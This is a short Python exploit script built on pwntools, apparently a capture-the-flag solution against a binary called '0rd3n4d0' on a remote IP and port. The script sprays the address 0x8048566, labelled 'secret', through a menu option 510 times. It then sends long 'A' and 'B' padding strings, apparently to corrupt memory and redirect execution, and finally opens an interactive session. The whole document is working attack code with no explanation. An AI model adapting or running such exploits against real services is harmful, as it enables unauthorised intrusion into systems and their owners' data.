from pwn import *
context.log_level = 'debug'

""" secret = 0x8048566 """


elf=ELF("./0rd3n4d0")
def start():

    return remote("52.15.230.94","3190")
#{52.15.230.94:3190}
# 
p=start()
def exec_fmt(s):
    # p.sendlineafter("2-Ordenar","1")
    p.sendline("1")
    sleep(0.1)
    p.sendline(s)
    sleep(0.1)
    # p.close()
   
    # return ret



for i in range(0,510):
    exec_fmt(p32(0x8048566))
    sleep(0.1)
p.sendlineafter("2-Ordenar","A"*600)
p.sendline(p32(0x8048566))
p.sendlineafter("2-Ordenar","B"*500)

p.interactive()  
